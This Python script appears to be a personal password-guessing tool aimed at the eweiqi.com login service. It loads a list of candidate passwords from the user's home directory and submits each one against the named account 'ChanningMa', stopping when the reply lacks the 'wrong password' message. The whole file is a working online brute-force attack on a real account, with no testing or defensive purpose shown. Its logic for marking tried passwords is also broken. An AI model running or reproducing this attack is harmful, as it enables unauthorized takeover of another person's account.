#!/usr/bin/env python3

import os
import re
import hashlib
import logging
from xml.etree import ElementTree
import sys
import time

sys.path.append(os.path.join(os.path.dirname(__file__), "../..", "autotry"))

from lib.HttpSess import HttpSess

# logger = logging.getLogger(__name__)
# logging.basicConfig(level=logging.DEBUG,
#                     format='[%(asctime)s](%(levelno)s) %(message)s',
#                     datefmt='%Y-%m-%d %H:%M:%S')

# logging.shutdown()

class Remini(object):
    def __init__(self):
        self.https = HttpSess('apitygem.eweiqi.com',
            headers={
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            secure=True)
        self.http = HttpSess('shop.eweiqi.com',
            headers={
                'User-Agent': 'Mozilla/5.0',
            })

    def login_encrypted(self, username='ChanningMa', password='123456'):
        url = '/client/pc/login/login.php'
        timestamp = f'{int(time.time() * 1000):d}'
        message = password + timestamp

        digest = hashlib.sha256(message.encode('utf-8')).hexdigest()

        payload = {
            'goto': 'banner_wait',
            'appid': username,
            'apppwd': digest,
            'scode': 0,
            'site_code': 3000,
            'svr_no': 0
        }

        res = self.http.hb_post(url, payload)

        return res

    def login(self, uid, pwd):
        global seq

        url='/login/login_module.php'
        payload = {
            'return_url': 'http://shop.eweiqi.com/api/eweiqi.php?returnuri=http%3A%2F%2Fwww.eweiqi.com%2F',
            'uid': uid,
            'pwd': pwd
        }

        tree = ElementTree.fromstring(self.https.hb_post(url, payload).text)
        request_api = re.search(r'(?<=shop.eweiqi.com)/api.*\d', tree.text)
        if request_api is None:
            return

        url = request_api.group(0)
        result = re.search(r'密码错误', self.http.hb_get(url).text)

        seq += 1
        ret = True if result is None else False

        print(f'{seq:04d} {pwd:>20s}: {ret}')
        return ret


if __name__ == "__main__":
    # for counting
    seq = 0

    r = Remini()

    home = os.path.expanduser('~')
    with open(os.path.join(home, 'potential_passwords.txt'), 'r+') as f:
        passwords = f.readlines()

        for password in passwords:
            if password.startswith('#'):
                continue

            password = password.strip('\n')

            if r.login('ChanningMa', password):
                break
            else:
                password = "# " + password

        f.writelines(passwords)
